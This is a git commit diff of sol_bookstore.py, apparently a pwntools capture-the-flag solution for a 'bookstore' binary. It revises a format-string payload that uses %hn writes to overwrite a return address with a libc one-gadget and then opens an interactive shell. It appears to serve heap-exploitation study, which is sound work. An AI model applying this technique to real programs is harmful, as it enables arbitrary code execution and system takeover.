42066899f42044ec5f2eccb9a6117295a417155a
Jonghyuk Song <jonghyk.song@gmail.com>
2017-05-22 12:20:21 +0900

    20170522

--- overlapping_chunks_example/sol_bookstore.py
+++ overlapping_chunks_example/sol_bookstore.py
@@ -42,36 +42,37 @@ def overwrite_fini():
     print p.recvuntil("0x")
     addr=int(p.recv(12),16)
     ret_addr = addr - 496
+    args_addr = ret_addr + 0x78
     print 'ret_addr', hex(ret_addr)
+    print 'args_addr', hex(args_addr)
+
 
 
     ################################
-    onegadget = libc_base + 0x4526a
+    #onegadget = libc_base + 0x4526a
     #onegadget = libc_base + 0xef6c4
-    #onegadget = libc_base + 0xf0567
-    #onegadget = libc_base + 0x44256
+    onegadget = libc_base + 0xf0567
     p.sendline("4")
+    print p.recvuntil("Submit\n")
     payload = "1"*8
+    payload += p64(args_addr+4)
     payload += p64(ret_addr)
     payload += p64(ret_addr+2)
     p.sendline(payload)
     print p.recvuntil(":")
 
-    #payload = "a"*8 + "%2587c" + "%13$hn" + "1000%c"+ "%14$hn"
-    a1 = str(int(hex(onegadget)[-4:],16)-30)
-    a2 = str(int("1"+hex(onegadget)[-8:-4],16)-int(a1)-30)
-    #a2 = str(int(hex(onegadget)[-9]+hex(onegadget)[-8:-4],16)-4)
+    a1 = str(int(hex(onegadget)[-4:],16))
+    a2 = str(int("2"+hex(onegadget)[-8:-4],16)-int(a1)-65536)
     print hex(onegadget)
     print a1, hex(int(a1))
     print a2, hex(int(a2))
-    raw_input("1")
-    payload = "a"*8 + "%"+a1+"c" + "%13$hn" + "%"+a2+"c"+"%14$hn"
-    payload += "b"*(136-len(payload))
+    payload = "A"*51 +"%65511c" + "%13$hn" +"%"+a1+"c"+ "%14$hn" + "%"+a2+"c"+ "%15$hn" 
+    payload += "\x00"*(136-len(payload))
     payload += p64(0x150)
     p.sendline(payload)
+    print p.recvuntil("Submit\n")
+    p.sendline("5")
     p.interactive()
-    #p.sendline("5")
-    print "END"
 
 if __name__ == "__main__":
     p = process("./bookstore")
